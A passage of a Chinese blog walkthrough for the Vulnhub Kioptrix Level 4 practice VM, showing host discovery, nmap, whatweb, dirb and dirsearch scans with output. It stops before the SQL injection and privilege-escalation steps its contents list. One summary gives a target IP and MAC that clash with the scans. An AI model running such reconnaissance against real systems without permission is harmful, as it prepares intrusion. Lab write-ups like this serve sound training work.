<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>vuInhub靶场实战系列--Kioptrix Level #4 - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/9d45c50111ef653ff849fbbfa4952bbe/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="vuInhub靶场实战系列--Kioptrix Level #4">
  <meta property="og:description" content="免责声明 本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关。
目录 免责声明前言一、环境配置1.1 靶场信息1.2 靶场配置 二、信息收集2.1 主机发现2.1.1 netdiscover2.1.2 arp-scan主机扫描 2.2 端口扫描2.3 指纹识别2.4 目录扫描2.4.1 dirb目录扫描2.4.2 dirsearch目录扫描 2.5 漏洞切入点2.5.1 访问首页2.5.2 nmap漏洞扫描2.5.3 nikto漏洞扫描2.5.4 enum4linux漏洞扫描2.5.5 wfuzz模糊测试2.5.6 searchsploit搜索samba漏洞 三、渗透测试3.1 SQL注入3.1.1 Burp Suit抓登录包3.1.2 爆破数据库3.1.3 当前连接的数据库3.1.4 连接的数据库的表名3.1.5 字段名3.1.6 用户名和密码 3.2 shell逃逸3.2.1 ssh登录3.2.2 shell逃逸 3.3 mysql udf提权3.3.1 查看服务3.3.2 php文件查找3.3.3 查看php文件3.3.4 登录mysql数据库3.3.5 查看udf表3.3.6 管理员用户组添加3.3.7 切换超级管理员3.3.8 flag 渗透总结参考文章 前言 今日测试内容渗透Kioptrix Level #4靶机：
Vulnhub是一个提供各种漏洞环境的靶场平台，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞。本文介绍Kioptrix Level #4靶机渗透测试，内容包括主机扫描（nmap\netdiscover）、端口扫描（nmap\masscan）、目录扫描（dirb\dirsearch）、SQL注入、udf系统提权等内容。
Description
Back to the Top
Again a long delay between VMs, but that cannot be helped.">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-06-12T22:44:17+08:00">
    <meta property="article:modified_time" content="2024-06-12T22:44:17+08:00">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">vuInhub靶场实战系列--Kioptrix Level #4</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h2><a id="_0"></a>免责声明</h2> 
<p><code>本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关。</code></p> 
<p></p> 
<div class="toc"> 
 <h4>目录</h4> 
 <ul><li><a href="#_0" rel="nofollow">免责声明</a></li><li><a href="#_7" rel="nofollow">前言</a></li><li><a href="#_51" rel="nofollow">一、环境配置</a></li><li><ul><li><a href="#11__52" rel="nofollow">1.1 靶场信息</a></li><li><a href="#12__60" rel="nofollow">1.2 靶场配置</a></li></ul> 
  </li><li><a href="#_68" rel="nofollow">二、信息收集</a></li><li><ul><li><a href="#21__69" rel="nofollow">2.1 主机发现</a></li><li><ul><li><a href="#211_netdiscover_70" rel="nofollow">2.1.1 netdiscover</a></li><li><a href="#212_arpscan_84" rel="nofollow">2.1.2 arp-scan主机扫描</a></li></ul> 
   </li><li><a href="#22__104" rel="nofollow">2.2 端口扫描</a></li><li><a href="#23__155" rel="nofollow">2.3 指纹识别</a></li><li><a href="#24__230" rel="nofollow">2.4 目录扫描</a></li><li><ul><li><a href="#241_dirb_231" rel="nofollow">2.4.1 dirb目录扫描</a></li><li><a href="#242_dirsearch_283" rel="nofollow">2.4.2 dirsearch目录扫描</a></li></ul> 
   </li><li><a href="#25__329" rel="nofollow">2.5 漏洞切入点</a></li><li><ul><li><a href="#251__330" rel="nofollow">2.5.1 访问首页</a></li><li><a href="#252_nmap_339" rel="nofollow">2.5.2 nmap漏洞扫描</a></li><li><a href="#253_nikto_452" rel="nofollow">2.5.3 nikto漏洞扫描</a></li><li><a href="#254_enum4linux_506" rel="nofollow">2.5.4 enum4linux漏洞扫描</a></li><li><a href="#255_wfuzz_750" rel="nofollow">2.5.5 wfuzz模糊测试</a></li><li><a href="#256_searchsploitsamba_780" rel="nofollow">2.5.6 searchsploit搜索samba漏洞</a></li></ul> 
  </li></ul> 
  </li><li><a href="#_820" rel="nofollow">三、渗透测试</a></li><li><ul><li><a href="#31_SQL_822" rel="nofollow">3.1 SQL注入</a></li><li><ul><li><a href="#311_Burp_Suit_823" rel="nofollow">3.1.1 Burp Suit抓登录包</a></li><li><a href="#312__848" rel="nofollow">3.1.2 爆破数据库</a></li><li><a href="#313__1070" rel="nofollow">3.1.3 当前连接的数据库</a></li><li><a href="#314__1117" rel="nofollow">3.1.4 连接的数据库的表名</a></li><li><a href="#315__1171" rel="nofollow">3.1.5 字段名</a></li><li><a href="#316__1236" rel="nofollow">3.1.6 用户名和密码</a></li></ul> 
   </li><li><a href="#32_shell_1304" rel="nofollow">3.2 shell逃逸</a></li><li><ul><li><a href="#321_ssh_1305" rel="nofollow">3.2.1 ssh登录</a></li><li><a href="#322_shell_1328" rel="nofollow">3.2.2 shell逃逸</a></li></ul> 
   </li><li><a href="#33_mysql_udf_1354" rel="nofollow">3.3 mysql udf提权</a></li><li><ul><li><a href="#331__1355" rel="nofollow">3.3.1 查看服务</a></li><li><a href="#332_php_1465" rel="nofollow">3.3.2 php文件查找</a></li><li><a href="#333_php_1478" rel="nofollow">3.3.3 查看php文件</a></li><li><a href="#334_mysql_1532" rel="nofollow">3.3.4 登录mysql数据库</a></li><li><a href="#335_udf_1550" rel="nofollow">3.3.5 查看udf表</a></li><li><a href="#336__1566" rel="nofollow">3.3.6 管理员用户组添加</a></li><li><a href="#337__1582" rel="nofollow">3.3.7 切换超级管理员</a></li><li><a href="#338_flag_1599" rel="nofollow">3.3.8 flag</a></li></ul> 
  </li></ul> 
  </li><li><a href="#_1630" rel="nofollow">渗透总结</a></li><li><a href="#_1640" rel="nofollow">参考文章</a></li></ul> 
</div> 
<p></p> 
<hr> 
<h2><a id="_7"></a>前言</h2> 
<p><code>今日测试内容渗透Kioptrix Level #4靶机：</code></p> 
<p>Vulnhub是一个提供各种漏洞环境的靶场平台，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞。本文介绍Kioptrix Level #4靶机渗透测试，内容包括主机扫描（nmap\netdiscover）、端口扫描（nmap\masscan）、目录扫描（dirb\dirsearch）、SQL注入、udf系统提权等内容。</p> 
<blockquote> 
 <p>Description<br> Back to the Top<br> Again a long delay between VMs, but that cannot be helped. Work, family must come first. Blogs and hobbies are pushed down the list. These things aren’t as easy to make as one may think. Time and some planning must be put into these challenges, to make sure that:</p> 
 <ol><li>It’s possible to get root remotely [ Edit: sorry not what I meant ]<br> 1a. It’s possible to remotely compromise the machine<br> Stays within the target audience of this site<br> Must be “realistic” (well kinda…)<br> Should serve as a refresher for me. Be it PHP or MySQL usage etc. Stuff I haven’t done in a while.<br> I also had lots of troubles exporting this one. So please take the time to read my comments at the end of this post.<br> Keeping in the spirit of things, this challenge is a bit different than the others but remains in the realm of the easy. Repeating myself I know, but things must always be made clear: These VMs are for the beginner. It’s a place to start.<br> I’d would love to code some small custom application for people to exploit. But I’m an administrator not a coder. It would take too much time to learn/code such an application. Not saying I’ll never try doing one, but I wouldn’t hold my breath. If someone wants more difficult challenges, I’m sure the Inter-tubes holds them somewhere. Or you can always enroll in Offsec’s PWB course. *shameless plug<br> – A few things I must say. I made this image using a new platform. Hoping everything works but I can’t test for everything. Initially the VM had troubles getting an IP on boot-up. For some reason the NIC wouldn’t go up and the machine was left with the loopback interface. I hope that I fixed the problem. Don’t be surprised if it takes a little moment for this one to boot up. It’s trying to get an IP. Be a bit patient. Someone that tested the image for me also reported the VM hung once powered on. Upon restart all was fine. Just one person reported this, so hoping it’s not a major issue. If you plan on running this on vmFusion, you may need to convert the imagine to suit your fusion version.<br> – Also adding the VHD file for download, for those using Hyper-V. You guys may need to change the network adapter to “Legacy Network Adapter”. I’ve test the file and this one seems to run fine for me… If you’re having problems, or it’s not working for any reason email comms[=]kioptrix.com<br> Thanks to @shai_saint from www.n00bpentesting.com for the much needed testing with various VM solutions.<br> Thanks to Patrick from Hackfest.ca for also running the VM and reporting a few issues. And Swappage &amp; @Tallenz for doing the same. All help is appreciated guys<br> So I hope you enjoy this one.<br> The Kioptrix Team<br> Source: http://www.kioptrix.com/blog/?p=604<br> <strong>Note: Just a virtual hard drive. You’ll need to create a new virtual machine &amp; attach the existing hard drive</strong></li></ol> 
</blockquote> 
<blockquote> 
 <p>虚拟机之间再次存在很长的延迟，但这无济于事。 工作，家庭必须是第一位的。 博客和兴趣爱好排在列表的下方。 这些事情并不像人们想象的那么容易。 必须为这些挑战投入时间和一些计划，以确保：<br> 1.可以远程获得root权限[编辑：对不起，我的意思不是]<br> 1a. 可以远程破坏机器<br> 1.停留在此网站的目标受众范围内<br> 2.必须是“现实的”（好吧……）<br> 3.应该为我复习。 无论是PHP还是MySQL用法等等。我已经有一段时间没做过了。<br> 我也很难导出这个。 因此，请花时间阅读本文结尾处的评论。<br> 秉承事物的精神，这一挑战与其他挑战有所不同，但仍处于轻松的境界。 我知道自己重复一遍，但必须始终清楚：这些VM是针对初学者的。 这是一个起点。<br> 我很想编写一些小型的自定义应用程序，以供人们使用。 但我是管理员，不是编码员。 学习/编码这样的应用程序将花费太多时间。 并不是说我永远不会尝试做一个，但我不会屏住呼吸。 如果有人想要更艰巨的挑战，我敢肯定，Inter-tube会将他们抱在某个地方。 或者，您也可以随时注册Offsec的PWB课程。无耻的插头<br> – 我必须说几件事。 我使用新平台制作了这张图片。 希望一切正常，但我无法测试所有内容。 最初，VM在启动时很难获得IP。 由于某种原因，NIC无法启动，并且机器留有环回接口。 我希望我解决了这个问题。 如果这个启动需要一点时间，请不要感到惊讶。 它正在尝试获取IP。 有点耐心。 有人为我测试了映像，还报告说VM开机后就挂了。 重新启动后一切都很好。 只有一个人报告了此消息，因此希望这不是主要问题。 如果计划在vmFusion上运行它，则可能需要转换想象以适合您的融合版本。<br> – 还为使用Hyper-V的用户添加了VHD文件以供下载。 你们可能需要将网络适配器更改为“旧版网络适配器”。 我已经对该文件进行了测试，这个文件似乎对我来说还算不错…如果您遇到问题，或者由于某种原因它无法正常工作，请发送电子邮件comms [=]kioptrix.com<br> 感谢www.n00bpentesting.com上的@shai_saint使用各种VM解决方案进行急需的测试。<br> 感谢Hackfest.ca的Patrick也运行了VM并报告了一些问题。 Swappage和@Tallenz也这样做。 所有的帮助都是感激的家伙<br> 所以我希望你喜欢这个。<br> Kioptrix团队<br> Note:只是一个虚拟硬盘。 您需要创建一个新的虚拟机并附加现有的硬盘驱动</p> 
</blockquote> 
<hr> 
<h2><a id="_51"></a>一、环境配置</h2> 
<h3><a id="11__52"></a>1.1 靶场信息</h3> 
<table><thead><tr><th>官方链接</th><th>[https://www.vulnhub.com/entry/kioptrix-level-13-4,25/)</th></tr></thead><tbody><tr><td>发布日期</td><td>2012年2月8日</td></tr><tr><td>靶场大小</td><td>208MB</td></tr><tr><td>作者</td><td>Kioptrix</td></tr><tr><td>系列</td><td>Kioptrix</td></tr><tr><td>难度</td><td>★☆☆☆☆</td></tr></tbody></table> 
<h3><a id="12__60"></a>1.2 靶场配置</h3> 
<ul><li>渗透测试环境配置，请参考作者前面的内容<a href="https://editor.csdn.net/md/?articleId=139026849" rel="nofollow">vuInhub靶场实战系列-DC-2实战</a></li><li><a href="https://editor.csdn.net/md/?articleId=139386354" rel="nofollow">【解决办法】- 靶机导入VMware后无法自动获取IP地址</a></li><li><a href="https://mp.weixin.qq.com/s/ABUtf_UuMGlLg26UyHIKzA" rel="nofollow"> 建议将攻击机（kali）的网络模式设置为【<strong>桥接模式</strong>】</a></li><li><a href="https://editor.csdn.net/md/?articleId=139583824" rel="nofollow">VMware导入vmdk文件（亲测有效）</a></li></ul> 
<hr> 
<h2><a id="_68"></a>二、信息收集</h2> 
<h3><a id="21__69"></a>2.1 主机发现</h3> 
<h4><a id="211_netdiscover_70"></a>2.1.1 netdiscover</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># netdiscover -r 192.168.1.0/24</span>
 Currently scanning: Finished<span class="token operator">!</span>   <span class="token operator">|</span>   Screen View: Unique Hosts                                                        
                                                                                                                      
 <span class="token number">5</span> Captured ARP Req/Rep packets, from <span class="token number">3</span> hosts.   Total size: <span class="token number">300</span>                                                      
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 <span class="token number">192.168</span>.1.6     00:0c:29:41:10:00      <span class="token number">1</span>      <span class="token number">60</span>  VMware, Inc.                                                       
 <span class="token number">192.168</span>.1.13    ae:d5:7e:a8:51:6a      <span class="token number">2</span>     <span class="token number">120</span>  Unknown vendor                                                     
 <span class="token number">192.168</span>.1.1     a0:54:f9:b3:23:54      <span class="token number">2</span>     <span class="token number">120</span>  Unknown vendor  
</code></pre> 
<h4><a id="212_arpscan_84"></a>2.1.2 arp-scan主机扫描</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># arp-scan -l</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:b6:02:f0, IPv4: <span class="token number">192.168</span>.1.111
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.1.6	00:0c:29:41:10:00	VMware, Inc.
<span class="token number">192.168</span>.1.13	ae:d5:7e:a8:51:6a	<span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.1.8	<span class="token number">22</span>:cb:7f:9b:2c:c1	<span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>

<span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">2.388</span> seconds <span class="token punctuation">(</span><span class="token number">107.20</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded


</code></pre> 
<blockquote> 
 <p>综上所述的2种扫描方式，获得靶机信息<br> <strong>IP地址：192.168.1.11</strong><br> <strong>MAC地址：00:0c:29:b2:d4:13</strong></p> 
</blockquote> 
<h3><a id="22__104"></a>2.2 端口扫描</h3> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># nmap -sC -sV -oA Kioptrix4 192.168.1.6</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-06-12 08:34 EDT
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.1.6
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00028s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">566</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>, <span class="token number">430</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT    STATE SERVICE     VERSION
<span class="token number">22</span>/tcp  <span class="token function">open</span>  <span class="token function">ssh</span>         OpenSSH <span class="token number">4</span>.7p1 Debian 8ubuntu1.2 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">1024</span> 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 <span class="token punctuation">(</span>DSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">2048</span> <span class="token number">85</span>:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp  <span class="token function">open</span>  http        Apache httpd <span class="token number">2.2</span>.8 <span class="token punctuation">((</span>Ubuntu<span class="token punctuation">)</span> PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-server-header: Apache/2.2.8 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span> PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">)</span>.
<span class="token number">139</span>/tcp <span class="token function">open</span>  netbios-ssn Samba smbd <span class="token number">3</span>.X - <span class="token number">4</span>.X <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span>
<span class="token number">445</span>/tcp <span class="token function">open</span>  netbios-ssn Samba smbd <span class="token number">3.0</span>.28a <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span>
MAC Address: 00:0C:29:41:10:00 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

Host script results:
<span class="token operator">|</span> smb-os-discovery: 
<span class="token operator">|</span>   OS: Unix <span class="token punctuation">(</span>Samba <span class="token number">3.0</span>.28a<span class="token punctuation">)</span>
<span class="token operator">|</span>   Computer name: Kioptrix4
<span class="token operator">|</span>   NetBIOS computer name: 
<span class="token operator">|</span>   Domain name: localdomain
<span class="token operator">|</span>   FQDN: Kioptrix4.localdomain
<span class="token operator">|</span>_  System time: <span class="token number">2024</span>-06-12T16:34:31-04:00
<span class="token operator">|</span> smb-security-mode: 
<span class="token operator">|</span>   account_used: guest
<span class="token operator">|</span>   authentication_level: user
<span class="token operator">|</span>   challenge_response: supported
<span class="token operator">|</span>_  message_signing: disabled <span class="token punctuation">(</span>dangerous, but default<span class="token punctuation">)</span>
<span class="token operator">|</span>_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <span class="token operator">&lt;</span>unknown<span class="token operator">&gt;</span>, NetBIOS MAC: <span class="token operator">&lt;</span>unknown<span class="token operator">&gt;</span> <span class="token punctuation">(</span>unknown<span class="token punctuation">)</span>
<span class="token operator">|</span>_smb2-time: Protocol negotiation failed <span class="token punctuation">(</span>SMB2<span class="token punctuation">)</span>
<span class="token operator">|</span>_clock-skew: mean: 9h59m59s, deviation: 2h49m42s, median: 7h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">48.34</span> seconds

</code></pre> 
<blockquote> 
 <p>综上所述，获得靶机开放的端口信息：<br> 22端口：ssh服务<br> 80端口：http服务<br> 139端口：netbios-ssn<br> 445端口：netbios-ssn</p> 
</blockquote> 
<h3><a id="23__155"></a>2.3 指纹识别</h3> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># whatweb -v 192.168.1.6</span>
WhatWeb report <span class="token keyword">for</span> http://192.168.1.6
Status    <span class="token builtin class-name">:</span> <span class="token number">200</span> OK
Title     <span class="token builtin class-name">:</span> <span class="token operator">&lt;</span>None<span class="token operator">&gt;</span>
IP        <span class="token builtin class-name">:</span> <span class="token number">192.168</span>.1.6
Country   <span class="token builtin class-name">:</span> RESERVED, ZZ

Summary   <span class="token builtin class-name">:</span> Apache<span class="token punctuation">[</span><span class="token number">2.2</span>.8<span class="token punctuation">]</span>, HTTPServer<span class="token punctuation">[</span>Ubuntu Linux<span class="token punctuation">]</span><span class="token punctuation">[</span>Apache/2.2.8 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span> PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch<span class="token punctuation">]</span>, PasswordField<span class="token punctuation">[</span>mypassword<span class="token punctuation">]</span>, PHP<span class="token punctuation">[</span><span class="token number">5.2</span>.4-2ubuntu5.6<span class="token punctuation">]</span><span class="token punctuation">[</span>Suhosin-Patch<span class="token punctuation">]</span>, X-Powered-By<span class="token punctuation">[</span>PHP/5.2.4-2ubuntu5.6<span class="token punctuation">]</span>

Detected Plugins:
<span class="token punctuation">[</span> Apache <span class="token punctuation">]</span>
	The Apache HTTP Server Project is an effort to develop and 
	maintain an open-source HTTP server <span class="token keyword">for</span> modern operating 
	systems including UNIX and Windows NT. The goal of this 
	project is to provide a secure, efficient and extensible 
	server that provides HTTP services <span class="token keyword">in</span> <span class="token function">sync</span> with the current 
	HTTP standards. 

	Version      <span class="token builtin class-name">:</span> <span class="token number">2.2</span>.8 <span class="token punctuation">(</span>from HTTP Server Header<span class="token punctuation">)</span>
	Google Dorks: <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
	Website     <span class="token builtin class-name">:</span> http://httpd.apache.org/

<span class="token punctuation">[</span> HTTPServer <span class="token punctuation">]</span>
	HTTP server header string. This plugin also attempts to 
	identify the operating system from the server header. 

	OS           <span class="token builtin class-name">:</span> Ubuntu Linux
	String       <span class="token builtin class-name">:</span> Apache/2.2.8 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span> PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch <span class="token punctuation">(</span>from server string<span class="token punctuation">)</span>

<span class="token punctuation">[</span> PHP <span class="token punctuation">]</span>
	PHP is a widely-used general-purpose scripting language 
	that is especially suited <span class="token keyword">for</span> Web development and can be 
	embedded into HTML. This plugin identifies PHP errors, 
	modules and versions and extracts the <span class="token builtin class-name">local</span> <span class="token function">file</span> path and 
	username <span class="token keyword">if</span> present. 

	Version      <span class="token builtin class-name">:</span> <span class="token number">5.2</span>.4-2ubuntu5.6
	Module       <span class="token builtin class-name">:</span> Suhosin-Patch
	Version      <span class="token builtin class-name">:</span> <span class="token number">5.2</span>.4-2ubuntu5.6
	Google Dorks: <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
	Website     <span class="token builtin class-name">:</span> http://www.php.net/

<span class="token punctuation">[</span> PasswordField <span class="token punctuation">]</span>
	<span class="token function">find</span> password fields 

	String       <span class="token builtin class-name">:</span> mypassword <span class="token punctuation">(</span>from field name<span class="token punctuation">)</span>

<span class="token punctuation">[</span> X-Powered-By <span class="token punctuation">]</span>
	X-Powered-By HTTP header 

	String       <span class="token builtin class-name">:</span> PHP/5.2.4-2ubuntu5.6 <span class="token punctuation">(</span>from x-powered-by string<span class="token punctuation">)</span>

HTTP Headers:
	HTTP/1.1 <span class="token number">200</span> OK
	Date: Wed, <span class="token number">12</span> Jun <span class="token number">2024</span> <span class="token number">20</span>:38:05 GMT
	Server: Apache/2.2.8 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span> PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
	X-Powered-By: PHP/5.2.4-2ubuntu5.6
	Content-Length: <span class="token number">1255</span>
	Connection: close
	Content-Type: text/html

</code></pre> 
<blockquote> 
 <p>获得关键信息;</p> 
 <ul><li>Apache[2.2.8],</li><li>HTTPServer[Ubuntu Linux][Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch],</li><li>PasswordField[mypassword],</li><li>PHP[5.2.4-2ubuntu5.6][Suhosin-Patch],</li><li>X-Powered-By[PHP/5.2.4-2ubuntu5.6]</li></ul> 
</blockquote> 
<h3><a id="24__230"></a>2.4 目录扫描</h3> 
<h4><a id="241_dirb_231"></a>2.4.1 dirb目录扫描</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># dirb http://192.168.1.6</span>

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Jun <span class="token number">12</span> 08:40:08 <span class="token number">2024</span>
URL_BASE: http://192.168.1.6/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: <span class="token number">4612</span>                                                          

---- Scanning URL: http://192.168.1.6/ ----
+ http://192.168.1.6/cgi-bin/ <span class="token punctuation">(</span>CODE:403<span class="token operator">|</span>SIZE:326<span class="token punctuation">)</span>                                                                                                                                                              
<span class="token operator">==</span><span class="token operator">&gt;</span> DIRECTORY: http://192.168.1.6/images/                                                                                                                                                                      
+ http://192.168.1.6/index <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:1255<span class="token punctuation">)</span>                                                                                                                                                                
+ http://192.168.1.6/index.php <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:1255<span class="token punctuation">)</span>                                                                                                                                                            
<span class="token operator">==</span><span class="token operator">&gt;</span> DIRECTORY: http://192.168.1.6/john/                                                                                                                                                                        
+ http://192.168.1.6/logout <span class="token punctuation">(</span>CODE:302<span class="token operator">|</span>SIZE:0<span class="token punctuation">)</span>                                                                                                                                                                  
+ http://192.168.1.6/member <span class="token punctuation">(</span>CODE:302<span class="token operator">|</span>SIZE:220<span class="token punctuation">)</span>                                                                                                                                                                
+ http://192.168.1.6/server-status <span class="token punctuation">(</span>CODE:403<span class="token operator">|</span>SIZE:331<span class="token punctuation">)</span>                                                                                                                                                         
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.6/images/ ----
<span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
    <span class="token punctuation">(</span>Use mode <span class="token string">'-w'</span> <span class="token keyword">if</span> you want to scan it anyway<span class="token punctuation">)</span>
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.6/john/ ----
<span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
    <span class="token punctuation">(</span>Use mode <span class="token string">'-w'</span> <span class="token keyword">if</span> you want to scan it anyway<span class="token punctuation">)</span>
                                                                               
-----------------
END_TIME: Wed Jun <span class="token number">12</span> 08:40:33 <span class="token number">2024</span>
DOWNLOADED: <span class="token number">4612</span> - FOUND: <span class="token number">6</span>


</code></pre> 
<blockquote> 
 <p>FOUND: 6，发现6个目录</p> 
 <ul><li>http://192.168.1.6/cgi-bin/</li><li>http://192.168.1.6/index</li><li>http://192.168.1.6/index.php</li><li>http://192.168.1.6/logout</li><li>http://192.168.1.6/member</li><li>http://192.168.1.6/server-status</li></ul> 
</blockquote> 
<h4><a id="242_dirsearch_283"></a>2.4.2 dirsearch目录扫描</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># dirsearch -u 192.168.1.6 -e * -x 404,403</span>
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources <span class="token function">import</span> DistributionNotFound, VersionConflict

  _<span class="token operator">|</span><span class="token builtin class-name">.</span> _ _  _  _  _ _<span class="token operator">|</span>_    v0.4.3
 <span class="token punctuation">(</span>_<span class="token operator">||</span><span class="token operator">|</span> _<span class="token punctuation">)</span> <span class="token punctuation">(</span>/_<span class="token punctuation">(</span>_<span class="token operator">||</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">)</span>

Extensions: <span class="token number">39772</span>.zip <span class="token operator">|</span> HTTP method: GET <span class="token operator">|</span> Threads: <span class="token number">25</span> <span class="token operator">|</span> Wordlist size: <span class="token number">9481</span>

Output File: /home/kali/reports/_192.168.1.6/_24-06-12_08-40-50.txt

Target: http://192.168.1.6/

<span class="token punctuation">[</span>08:40:50<span class="token punctuation">]</span> Starting: 
<span class="token punctuation">[</span>08:41:17<span class="token punctuation">]</span> <span class="token number">200</span> -  109B  - /checklogin                                       
<span class="token punctuation">[</span>08:41:17<span class="token punctuation">]</span> <span class="token number">200</span> -  109B  - /checklogin.php                                   
<span class="token punctuation">[</span>08:41:22<span class="token punctuation">]</span> <span class="token number">200</span> -  298B  - /database.sql                                     
